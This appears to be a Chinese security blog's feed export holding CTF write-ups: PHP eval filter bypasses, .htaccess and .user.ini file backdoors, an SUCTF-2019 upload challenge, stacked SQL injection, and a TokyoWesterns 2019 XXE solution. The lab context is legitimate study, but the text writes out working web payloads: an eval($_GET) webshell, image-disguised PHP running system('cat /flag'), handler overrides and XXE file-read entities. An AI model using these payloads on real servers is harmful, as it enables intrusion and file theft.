<code>_GET</code> 来去读取 <code>getFlag()</code> </p><p>可以通过连续调用异或来获得 <code>_GET</code> </p><pre><code>&lt;?php    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>通过构造 <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> 来获取参数</p><p>最后传入参数 getFlag</p><pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>后面的 <code>__</code> 我们不传值默认为 <code>NULL</code> 也就相当于 <code>getFlag()</code></p><p>事实上下面这也可以：</p><pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>对 <code>getFlag</code> 进行取反然后 <code>URL</code> 编码</p><pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>这个在{}中进行取反 <code>${~&quot;\xa0\xb8\xba\xab&quot;}</code> ，相当于 <code>$_GET</code>，拼接出了 <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>，传入 <code>+=getFlag()</code> 从而执行了函数`</p><h2 id="不用数字字母和下划线"><a href="#不用数字字母和下划线" class="headerlink" title="不用数字字母和下划线"></a>不用数字字母和下划线</h2><p>题目：</p><pre><code>&lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code = $_GET[&apos;code&apos;];    if(strlen($code)&gt;50){        die(&quot;Too Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){        die(&quot;Not Allowed.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;  </code></pre><p>通过上面的取反就可以了</p><pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;$c = &quot;_GET&quot;;echo urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>这里利用 <code>${}</code> 中的代码可以执行的特点，在 <code>{}</code> 里进行取反操作，其实也就是可变变量</p><pre><code>&lt;?php    $a = &apos;hello&apos;;    $$a = &apos;world&apos;;    echo &quot;$a ${$a}&quot;;?&gt;输出：hello world</code></pre><p>这里的 <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> 相当于 <code>$_GET</code> .</p><p>还有更骚的，用中文：</p><pre><code>code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>相当于直接给变量赋值了，这样就不用 <code>{}</code> 了</p><h2 id="不用数字、字母、-、"><a href="#不用数字、字母、-、" class="headerlink" title="不用数字、字母、_、$"></a>不用数字、字母、_、$</h2><pre><code>&lt;?php include &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code=$_GET[&apos;code&apos;];    if(strlen($code)&gt;35){    die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))    {        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint=&quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p><p><code>?&gt;</code> 闭合php文件开头的 <code>&lt;?php</code> , <code>&lt;?</code> 相当于 <code>&lt;? echo</code> .</p><p>在配置文件中开启 <code>short_open_tag</code> 后可以使用短标签。默认是开启的。</p><h2 id="another-test"><a href="#another-test" class="headerlink" title="another test"></a>another test</h2><pre><code>&lt;?phphighlight_file(__FILE__);$_ = @$_GET[&apos;_&apos;];if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $_) )    die(&apos;rosé will not do it&apos;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )    die(&apos;you are so close, omg&apos;);eval($_);?&gt;</code></pre><p>主要是记录一下大佬的检测可用函数的脚本：</p><pre><code>&lt;?php $arr = get_defined_functions()[&apos;internal&apos;];foreach ($arr as $key =&gt; $value) {    if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $value) ){        unset($arr[$key]);        continue;    }    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){        unset($arr[$key]);        continue;    }}var_dump($arr);?&gt;</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p><p><a href="https://xz.aliyun.com/t/5677#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-3</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两种构成文件后门的方法</title>
      <link href="/2019/09/18/%E4%B8%A4%E7%A7%8D%E6%9E%84%E6%88%90%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2019/09/18/%E4%B8%A4%E7%A7%8D%E6%9E%84%E6%88%90%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini"><a href="#两种利用文件构成PHP后门的方法：-htaccess-amp-user-ini" class="headerlink" title="两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini"></a>两种利用文件构成PHP后门的方法：.htaccess &amp; .user.ini</h1><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>以下部分摘取于P神的博客<a href="http://www.vuln.cn/6001" title="P神博客" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p><h3 id="user-ini-是什么？"><a href="#user-ini-是什么？" class="headerlink" title=".user.ini 是什么？"></a>.user.ini 是什么？</h3><p>只要是以fastcgi运行的php都可以用<code>.user.ini</code>构成文件后门的方法。相比于<code>.htaccess</code>有更大的利用空间。 </p><p>我们从php手册可以看到php.ini是php默认的配置文件，这里是配置选项列表<a href="https://www.php.net/manual/zh/ini.list.php" title="配置项列表" target="_blank" rel="noopener">https://www.php.net/manual/zh/ini.list.php</a>  从表中我们可以看到有 <code>PHP_INI_PERDIR</code>、<code>PHP_INI_SYSTEM</code>    、<code>PHP_INI_USER</code>、<code>PHP_INI_ALL</code> 四种模式，那么这四种有什么区别呢？  </p><pre><code>模式                含义PHP_INI_USER    可在用户脚本（例如 ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定PHP_INI_PERDIR    可在 php.ini，.htaccess 或 httpd.conf 中设定PHP_INI_SYSTEM    可在 php.ini 或 httpd.conf 中设定PHP_INI_ALL        可在任何地方设定</code></pre><p>这里提到了我们可以自己设置的模式有 <code>PHP_INI_USER</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>。 在这里我们看到了 <code>.user.ini</code> 。翻阅手册<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" title="手册" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.file.per-user.php</a>可知：</p><blockquote><p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 <strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置可被识别。</p><p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p><p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote><p>同时与php.ini不同的是.user.ini是一个能动态加载的配置文件，修改文件内容之后不需要重启中间件只需要等待  <code>user_ini.cache_ttl</code> 时间即可被加载。</p><p>也就是说 <code>.user.ini</code> 其实就是一个我们可以自定义php配置的文件。</p><h3 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h3><p>从php配置列表里我们发现无法配置一些关键的配置，但是在构成文件后门时我们找到了两个我们可以自己配置的选项：</p><p><img src="https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png" alt></p><p><strong>auto_prepend_file</strong></p><blockquote><p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p><p>The special value none disables auto-prepending.</p></blockquote><p>指定一个文件在主文件之前自动解析，这个被包含的文件相当于在主文件之前调用了 <code>require</code> 函数，路径受到<code>include_path</code> 限制。 <code>include_path</code> 会指定 <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> 这些函数执行时去哪寻找文件。</p><p><strong>auto_append_file</strong></p><blockquote><p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p><p>The special value none disables auto-appending.</p><p>Note: If the script is terminated with exit(), auto-append will not occur.</p></blockquote><p>我们利用的重点是第一个配置，同时我们从文档也可以看出在利用时我们需要一个<strong>正常</strong>的php文件来包含我们的webshell，*<em>也就是说我们只有在文件夹里有可以正常解析(使用fastcgi模式解析)的php文件时才能这样利用。<br>*</em><br>使用时也简单直接写在<code>.user.ini</code>中</p><pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id="效果如何？"><a href="#效果如何？" class="headerlink" title="效果如何？"></a>效果如何？</h3><p>环境win10+php-5.45-nts+Nginx</p><p>结果如下：</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg" alt="效果如图"></p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><h3 id="htaccess是什么？"><a href="#htaccess是什么？" class="headerlink" title=".htaccess是什么？"></a>.htaccess是什么？</h3><p>翻阅apaceh官方文档<a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/howto/htaccess.html</a>可知</p><blockquote><p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p></blockquote><p><code>.htaccess</code> 文件提供了一种目录级别的修改配置的方式。一个文件，包含一条或多条配置指令，放置于目录下，这些配置指令对当前目录和其所有子目录生效。</p><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p>我们在 <code>.htaccess</code> 文件中可以通过增加 <code>handler-name</code> 来配置文件的解析方式。比如你有一个目录，你想让它被 <code>imagemap rule files</code> 解析，你可以在在 <code>.htaccess</code> 文件中加入这段代码：</p><pre><code>SetHandler imap-file</code></pre><p>同样的，<code>AddType</code> 可指示文件管理系统对给出的文件名以选定的文件类型进行解析。</p><pre><code>AddType image/gif .gif</code></pre><p>同时，我们也可以在以 <code>php</code> 作为 <code>Apacec module</code> 时，通过 <code>php_value</code> 来配置PHP的配置选项：</p><pre><code>php_value name value</code></pre><p>设置指定的值. 只适合于 PHP_INI_ALL 和 PHP_INI_PERDIR 类型指令</p><h3 id="如何利用？-1"><a href="#如何利用？-1" class="headerlink" title="如何利用？"></a>如何利用？</h3><p><strong>文件解析上传漏洞</strong></p><p>.htaccess文件中定义了将上传的文件后缀名为 .jpg 格式的文件以 php 格式来解析文件。.htaccess 是apache服务器中的一个配置文件，不是上传的文件的黑名单之内，所以该类型文件可以上传成功。</p><pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>还可以这样：</p><pre><code># FileMatch 参数即为文件名的正则匹配&lt;FilesMatch &quot;sniperoj&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;// sniperoj&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>文件包含</strong></p><pre><code>index.php: (empty).htaccess:php_value auto_append_file /etc/hosts</code></pre><p><strong>PHP 代码执行</strong></p><pre><code>index.php: (empty).htaccess:php_value auto_append_file .htaccess#&lt;?php phpinfo();</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p><p><a href="http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html" target="_blank" rel="noopener">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p><p><a href="https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p><p><a href="https://httpd.apache.org/docs/current/mod/core.html#sethandler" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p><p><a href="https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p><p><a href="https://www.php.net/manual/en/configuration.changes.php" target="_blank" rel="noopener">https://www.php.net/manual/en/configuration.changes.php</a></p><p><a href="https://www.cnblogs.com/xia0zhiwei/p/4713438.html" target="_blank" rel="noopener">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p><p><a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF-2019</title>
      <link href="/2019/09/10/suctf-2019-WP/"/>
      <url>/2019/09/10/suctf-2019-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF-2019-WP"><a href="#SUCTF-2019-WP" class="headerlink" title="SUCTF-2019 WP"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>先上传一个 <code>websell.php</code>，显示后缀不合法(改<code>php5</code>、<code>php4</code>、<code>content-type</code>这些都不行)。</p><p>再上传一个图片马发现显示 <code>&amp;lt;? in contents!</code> ，就是说<code>&lt; ?</code>不能连续存在。</p><p>我们通过<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>来绕过对<code>&lt;?</code>的检测。这次我们得到回显<br>    exif_imagetype:not image!</p><p><code>exif_imagetype</code>用来判断图片类型，他读取一个图像的第一个字节并检查其签名。只要我们添加一个图片头就可以绕过，比如添加<code>GIF89a</code>.在添加完之后我们上传成功，此时的文件目录下除了我们上传的<code>webshell</code>还有一个<code>index.php</code>.</p><h3 id="user-ini-文件构成的后门"><a href="#user-ini-文件构成的后门" class="headerlink" title=".user.ini 文件构成的后门"></a>.user.ini 文件构成的后门</h3><p>详情看p神这篇文章<a href="http://www.vuln.cn/6001" title="点这里" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p><blockquote><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p></blockquote><blockquote><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p></blockquote><p><code>.user.ini</code>类似一个用户自定义的<code>php.ini</code>。我们能够自定义的设置是”<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>“的设置。（上面表格中没有提到的<code>PHP_INI_PERDIR</code>也可以在<code>.user.ini</code>中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。</p><p>和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p><img src="https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png" alt="php中两个配置"></p><p><code>auto_prepend_file</code> 意味这是在php脚本执行前会执行这个参数设置的脚本，类似于在文件前调用<code>require()</code>然后这个参数的脚本所在目录受<code>include_path</code>限制<br><code>append</code>是在<code>php</code>脚本执行后才执行的，但是要注意的是遇到<code>exit()</code>的时候，这个脚本也不能运行</p><p>使用的时候直接写在<code>.user.ini</code>中</p><pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gif是要包含的文件.所以我们可以借助这个配置项来让所有的php文件都“自动”包含这个文件。👍</p><p>某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。</p><p>.htaccess文件构成的后门看这里：<a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" title=".htaccess">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>这个只能用于Apache</p><p>看到这里我们发现当前目录下确实有<code>index.php</code>可以利用，于是我们开始吧🎈</p><h3 id="开始上传"><a href="#开始上传" class="headerlink" title="开始上传"></a>开始上传</h3><p>我们先构造<code>.user.ini</code>文件</p><pre><code>GIF89aauto_prepend_file=CK.jpg</code></pre><p>然后将其上传</p><p>接着构造图片马<code>CK.jpg</code></p><pre><code>GIF89a&lt;script language=&apos;php&apos;&gt;    system(&apos;cat /flag&apos;);&lt;/script&gt;</code></pre><p>成功上传之后我们访问上传后的页面即可看到flag。</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h2><p>存在堆叠注入，测试<code>1;show tables;</code>回显</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>测试<code>1;select * from Flag;</code>,flag被过滤了</p><p><code>.index.php.swp</code>存在源码泄露,源码如下  </p><pre><code>&lt;?php    session_start();    include_once &quot;config.php&quot;;    $post = array();    $get = array();    global $MysqlLink;    //GetPara();    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);    if(!$MysqlLink){        die(&quot;Mysql Connect Error!&quot;);    }    $selectDB = mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB){        die(&quot;Choose Database Error!&quot;);    }    foreach ($_POST as $k=&gt;$v){        if(!empty($v)&amp;&amp;is_string($v)){            $post[$k] = trim(addslashes($v));        }    }    foreach ($_GET as $k=&gt;$v){        }    }    //die();    ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php    if(isset($post[&apos;query&apos;])){        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){            //echo $post[&apos;query&apos;];            die(&quot;Nonono.&quot;);        }        if(strlen($post[&apos;query&apos;])&gt;40){            die(&quot;Too long.&quot;);        }        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;        mysqli_multi_query($MysqlLink,$sql);        do{            if($res = mysqli_store_result($MysqlLink)){                while($row = mysqli_fetch_row($res)){                    print_r($row);                }            }        }while(@mysqli_next_result($MysqlLink));    }    ?&gt;</code></pre><p>查询语句为：<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p><h3 id="logical-OR"><a href="#logical-OR" class="headerlink" title="|| logical OR"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;        -&gt; 1mysql&gt; SELECT 1 OR 0;        -&gt; 1mysql&gt; SELECT 0 OR 0;        -&gt; 0mysql&gt; SELECT 0 OR NULL;        -&gt; NULLmysql&gt; SELECT 1 OR NULL;        -&gt; 1</code></pre><blockquote><p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p></blockquote><h3 id="如何做？"><a href="#如何做？" class="headerlink" title="如何做？"></a>如何做？</h3><p>先来看一个msql的配置</p><p><strong>PIPES_AS_CONCAT</strong></p><blockquote><p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p></blockquote><p>如果配置了<code>sql_mode=PIPES_AS_CONCAT</code>，Mysql会把逻辑或当作一个字符串链接函数对待。  </p><p><strong>CONCAT(str1,str2,…)</strong></p><blockquote><p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p></blockquote><p><code>CONCAT()</code> returns NULL if any argument is NULL. </p><pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);        -&gt; &apos;MySQL&apos;mysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);        -&gt; NULLmysql&gt; SELECT CONCAT(14.3);        -&gt; &apos;14.3&apos;</code></pre><p>我们通过<code>sql_mode=PIPES_AS_CONCAT</code>来将flag带出来</p><p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p><p>语句为:</p><pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>payload:<code>*,1</code>构造<code>select *,1 || flag from Flag;</code> 即可查出全部内容。</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TokyoWestern 2019</title>
      <link href="/2019/09/05/TokyoWesterns-2019/"/>
      <url>/2019/09/05/TokyoWesterns-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="TokyoWestern-2019"><a href="#TokyoWestern-2019" class="headerlink" title="TokyoWestern 2019"></a>TokyoWestern 2019</h1><p>9/5/2019 5:20:26 PM 🎨</p><h2 id="ji2xji2"><a href="#ji2xji2" class="headerlink" title="ji2xji2"></a>ji2xji2</h2><p>拿到题目第一反应就是XXE，直接拿着之前博客的payload一顿试，结果得到了<code>failed to decode xml</code>，然后就在想是不是思路错了，没想到是读的文件不存在，其实拿最简单的</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>就能看出来可以解析，因为觉得不可能这么简单就没有试…</p><p>读源码</p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>这里我们要注意得到的加密后的数据在哪里结束</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg" alt="读源码"></p><p>得到源码，从第一句得到<strong>flag</strong>的位置</p><pre><code>&lt;?php**include &apos;flag.php&apos;;**$method = $_SERVER[&apos;REQUEST_METHOD&apos;];function die404($msg) {  http_response_code(404);  die($msg);}function check_type($obj) {  if (is_array($obj)) {    $key_is_str = function($obj) {      foreach($obj as $key=&gt;$val) {        if (is_int($key))          return false;      }      return true;    };    if ($key_is_str($obj)) {      return &apos;object&apos;;    }    else {      return &apos;array&apos;;    }  }  else {    return gettype($obj);  }}function json2xml($obj) {  $res = &apos;&apos;;  if (is_array($obj)) {    foreach($obj as $key =&gt; $val) {      switch(check_type($val)) {        case &apos;array&apos;:          foreach($val as $v) {            $res .= &quot;&lt;$key&gt;&quot;;            $res .= json2xml($v);            $res .= &quot;&lt;/$key&gt;&quot;;          }          break;        default: // object or primitive          $res .= &quot;&lt;$key&gt;&quot;;          $res .= json2xml($val);          $res .= &quot;&lt;/$key&gt;&quot;;          break;      }    }  }  else {    $res = (string)$obj;  }  return $res;}if ($method === &apos;POST&apos;) {  $jsonstr = $_POST[&apos;json&apos;];  $xmlstr = $_POST[&apos;xml&apos;];  if (!(empty($xmlstr) ^ empty($jsonstr))) {    die404(&apos;404&apos;);  }  if (!empty($jsonstr)) {    $obj = json_decode($jsonstr, true);    if (empty($obj)) {      die(&apos;failed to decode json&apos;);    }    $doc = new DOMDocument(&apos;1.0&apos;);    $doc-&gt;formatOutput = true;    $_obj = array();    $_obj[&apos;root&apos;] = $obj;    $doc-&gt;loadXML(json2xml($_obj));    echo $doc-&gt;saveXML();  }  if (!empty($xmlstr)) {    libxml_disable_entity_loader(false);    $obj = simplexml_load_string($xmlstr, &apos;SimpleXMLElement&apos;, LIBXML_NOENT);    if (empty($obj)) {      die(&apos;failed to decode xml&apos;);    }    echo json_encode($obj, JSON_PRETTY_PRINT);  }}else {?&gt;&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;JSON &lt;-&gt; XML Converter&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;textarea id=&quot;json&quot; name=&quot;json&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;    &lt;/textarea&gt;    &lt;input type=&quot;button&quot; id=&quot;x2j&quot; value=&quot;&lt;-&quot;/&gt;    &lt;input type=&quot;button&quot; id=&quot;j2x&quot; value=&quot;-&gt;&quot;/&gt;    &lt;textarea id=&quot;xml&quot; name=&quot;xml&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;    &lt;/textarea&gt;    &lt;script      src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;      integrity=&quot;sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=&quot;      crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;    &lt;script&gt;      $.get(&apos;/sample.json&apos;, function(data) {        $(&apos;#json&apos;).val(data);      }, &apos;text&apos;);      $(&apos;#j2x&apos;).on(&apos;click&apos;, function() {        $.post(&apos;/&apos;, {          json: $(&apos;#json&apos;).val()        }, function(data) {          $(&apos;#xml&apos;).val(data);        });      });      $(&apos;#x2j&apos;).on(&apos;click&apos;, function() {        $.post(&apos;/&apos;, {          xml: $(&apos;#xml&apos;).val()        }, function(data) {          $(&apos;#json&apos;).val(data);        });      });    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>读flag</p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>解密即可<br>    {<br>        “message”: “PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK”<br>    }</p><pre><code>$flag = &apos;TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}&apos;;</code></pre><h2 id="real-baby-rsa"><a href="#real-baby-rsa" class="headerlink" 